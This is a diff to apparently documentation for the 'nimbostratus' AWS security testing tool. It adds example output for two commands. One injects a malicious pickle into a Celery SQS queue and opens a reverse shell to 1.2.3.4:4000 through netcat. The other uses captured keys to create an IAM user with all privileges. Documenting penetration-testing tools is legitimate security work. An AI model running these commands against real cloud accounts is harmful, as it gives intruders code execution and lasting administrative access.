@@ -193,10 +193,17 @@ serialization method, but of course you'll find deployments like this in real li
 where this tool is being run has access to SQS, if that SQS has a Celery queue, verify that the Queue is using pickle and
 finally inject a raw message that will execute arbitrary commands when un-pickled.</p>
 
-<div class="highlight"><pre><span class="gp">$</span> nimbostratus celery-pickle-exploit --access-key<span class="o">=</span>... --secret-key<span class="o">=</span>... <span class="se">\</span>
-<span class="go">                                     --queue-name=celery --region=ap-southeast-1 \</span>
-<span class="go">                                     --reverse=1.2.3.4:4000</span>
-<span class="go">...</span>
+<div class="highlight"><pre><span class="gp">$</span> nimbostratus celery-pickle-exploit --access-key<span class="o">=</span>... <span class="se">\</span>
+                  --secret-key<span class="o">=</span>... --reverse 1.2.3.4:4000 <span class="se">\</span>
+                  --queue-name nimbostratus-celery --region ap-southeast-1
+<span class="go">
+Starting celery-exploit
+SQS queue nimbostratus-celery is vulnerable
+We can write to the SQS queue.
+Start a netcat to listen for connections at 1.2.3.4:4000 and press enter.
+
+Sent payload to SQS, wait for the reverse connection!
+</span>
 </pre></div>
 
 <h2>
@@ -206,7 +213,17 @@ finally inject a raw message that will execute arbitrary commands when un-pickle
 create it (with permissions to access all Amazon resources) and return API key and secret.</p>
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus create-iam-user --access-key<span class="o">=</span>... --secret-key<span class="o">=</span>...
-<span class="go">...</span>
+<span class="go">
+Starting create-iam-user
+Trying to create user "bdkgpnenu"
+User "bdkgpnenu" created
+Trying to create user "bdkgpnenu" access keys
+Created access keys for user bdkgpnenu. Access key: ..., access secret: ...
+Created user bdkgpnenu with ALL PRIVILEGES. User information:
+    * Access key: ...
+    * Secret key: ...
+    * Policy name: nimbostratusbdkgpnenu
+</span>
 </pre></div>
 
 <h1>
